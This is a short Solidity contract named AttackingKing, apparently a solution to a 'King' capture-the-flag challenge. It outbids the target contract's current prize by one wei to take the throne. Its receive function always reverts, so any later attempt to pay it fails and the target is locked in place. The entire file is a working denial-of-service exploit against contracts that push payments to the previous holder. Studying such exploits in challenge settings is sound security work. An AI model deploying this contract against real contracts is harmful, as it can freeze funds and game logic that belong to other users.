// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

interface IKing {
    function prize() external returns (uint);
}

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint bid = IKing(contractAddress).prize() + 1 wei;
        (bool success, ) = contractAddress.call{value: bid}("");
        require(success);
    }

    receive() external payable {
        revert();
    }

}
